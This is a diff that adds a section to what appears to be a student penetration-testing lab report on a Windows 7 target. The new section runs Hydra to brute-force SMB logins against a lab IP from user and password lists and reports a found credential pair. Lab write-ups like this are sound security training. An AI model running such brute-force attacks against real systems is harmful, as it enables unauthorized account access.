@@ -80,3 +80,22 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
 **Figure 3:** Contents of `users.txt` and `wordlist.txt`.
 
 ---
+### 3.4 Online Cracking with Hydra
+
+**Objective:** Attempt to discover valid credentials by performing a brute-force attack over SMB.
+
+**Steps Taken:**
+1. Run Hydra:
+   ```bash
+   hydra -L users.txt -P wordlist.txt smb://192.168.57.20
+   ```
+   - `-L`: Specifies the user list file
+   - `-P`: Specifies the password list file
+   - `smb://`: Protocol and target IP
+
+**Results:**
+- Found valid credentials: `student : P@ssw0rd`
+
+**Figure 4:** Hydra output showing successful login.
+
+---
